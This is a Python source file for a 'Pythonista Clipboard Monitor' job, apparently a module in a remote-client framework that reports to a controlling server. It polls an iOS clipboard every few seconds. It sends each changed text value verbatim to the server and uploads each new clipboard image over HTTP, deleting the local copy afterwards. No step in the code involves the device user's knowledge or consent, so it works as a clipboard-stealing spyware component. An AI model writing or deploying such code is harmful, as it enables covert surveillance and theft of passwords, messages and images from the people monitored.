JOB_METADATA = {
    "name": "pythonista_clipboard_monitor",
    "display_name": "Pythonista Clipboard Monitor",
    "description": "Monitor Pythonista clipboard text and optional images",
    "platforms": ["ios"],
    "params": [
        {
            "name": "interval_seconds",
            "type": "integer",
            "required": False,
            "default": 3,
            "min": 1,
            "description": "Polling interval in seconds"
        },
        {
            "name": "transfer_images",
            "type": "boolean",
            "required": False,
            "default": True,
            "description": "Upload clipboard images when available"
        }
    ]
}

import hashlib
import os
import threading
import time

from client.jobs.core.job import Job
from core.utils.formatting import get_size
from core.utils.artifact_naming import build_artifact_filename
from core.utils.logger import logger


class PythonistaClipboardMonitor(Job):
    def __init__(self):
        super().__init__()
        self.recent_text = None
        self.image_hash = None
        self.transfer_images = True
        self.interval = 3

    def on_context_bound(self):
        self.interval = int(self.get_job_param('interval_seconds', 3) or 3)
        self.transfer_images = bool(self.get_job_param('transfer_images', True))

    def run(self):
        try:
            time.sleep(2)
            import clipboard
            self.send_to_server(1, 'Dependency loaded: pythonista clipboard', 0)

            if self.transfer_images:
                from PIL import Image
                self.send_to_server(1, 'Dependency loaded: pillow', 0)

            self.mark_running()
            self.send_to_server(1, 'Pythonista clipboard monitor started', 0)

            while not self.stop_event.is_set():
                try:
                    if self.transfer_images:
                        clipboard_image = clipboard.get_image()
                        if clipboard_image is not None:
                            self._handle_image_change(clipboard_image)
                        else:
                            clipboard_text = clipboard.get()
                            self._handle_text_change(clipboard_text)
                    else:
                        clipboard_text = clipboard.get()
                        self._handle_text_change(clipboard_text)
                except Exception as e:
                    self.send_to_server(0, f'Clipboard polling error: {e}', 0)

                time.sleep(self.interval)

            self.send_to_server(1, 'Pythonista clipboard monitor stopped', 0)
        except Exception as e:
            self.send_to_server(0, f'Pythonista clipboard monitor error: {e}', 0)
        finally:
            self.mark_stopped()
            logger.info(f'Thread ended: {threading.current_thread().name}')
            self.send_to_server(1, f'Task ended: {threading.current_thread().name}', 1)

    def stop(self, notify: bool = True):
        self.request_stop(notify=notify)

    def _handle_text_change(self, text):
        if text and text != self.recent_text:
            self.recent_text = text
            self.send_to_server(1, f'Clipboard text changed: {text}', 0)

    def _handle_image_change(self, image):
        try:
            # 统一一下模式，避免同一张图因为模式差异导致 hash 不稳定
            if hasattr(image, 'convert'):
                image_for_hash = image.convert('RGBA')
            else:
                image_for_hash = image

            image_hash = hashlib.sha256(image_for_hash.tobytes()).hexdigest()

            if image_hash != self.image_hash:
                self.image_hash = image_hash

                file_name = build_artifact_filename('clipboard', 'png')

                try:
                    image_for_hash.save(file_name, 'PNG')
                    file_size = os.path.getsize(file_name)

                    self.send_to_server(
                        1,
                        f'Clipboard image detected, uploading: {file_name} ({get_size(file_size)})',
                        0
                    )

                    try:
                        self.upload_file_via_http(file_name, folder='Clipboard')
                        self.send_to_server(1, f'Clipboard image uploaded successfully: {file_name}', 0)
                    finally:
                        try:
                            os.remove(file_name)
                        except Exception as e:
                            self.send_to_server(0, f'Failed to remove temporary clipboard_image: {e}', 0)

                except Exception as e:
                    self.send_to_server(0, f'Failed to save clipboard image: {e}', 0)

        except Exception as e:
            self.send_to_server(0, f'Failed to process clipboard image: {e}', 0)